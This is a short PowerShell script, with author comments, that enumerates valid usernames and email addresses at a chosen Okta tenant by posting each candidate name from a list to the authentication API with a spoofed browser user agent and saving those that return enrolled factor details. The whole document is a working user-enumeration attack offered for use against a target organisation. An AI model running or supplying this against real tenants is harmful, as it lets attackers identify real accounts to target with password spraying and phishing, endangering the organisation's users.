# enum users via okta

<# 

this script utilizes okta to enumerate usernames/email addresses at a given tenant

to use it, create a file called user-file.txt filled with all the various usernames you wish to test, then adjust the $targetTenant variable to store the tenant code of your target (for instance, if the target's okta login is https://tenantcode.okta.com, the $targetTenant you would set would be tenantcode), then run it

the script will output a file with all the user's found to exist

note: if a username exists but is not authorized for remote login, okta will return HTTP 401 -- for this reason, I have set it up so that the username is echoed to screen before each request -- if there is a 401 response after a username, it means the username exists but is not authorized for remote login via okta

additional note: I am not currently certain whether this is universally valid for all orgs using okta, or if this is specific to a particular config/implementation -- will update with more as I learn!

#>

$targetTenant = "tenantcode"
$userList = get-content user-file.txt
$targetUri = "https://$targetTenant`.okta.com/api/v1/authn"
foreach ($u in $userList) {

$body = @"
{
	"username":"$u",
	"options":{
	"warnBeforePasswordExpired":true,
	"multiOptionalFactorEnroll":true
	}
}
"@

	$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

	$u

	$response = (iwr -method 'POST' -body $body -useragent $userAgent -contenttype 'application/json' $targetUri).content | convertfrom-json

	$enumTest = ""

	$enumTest = $response._embedded.factors.profile
	
	if ($enumTest.credentialId) {
	
		$enumTest >> enummed-users.txt
	
	}

}
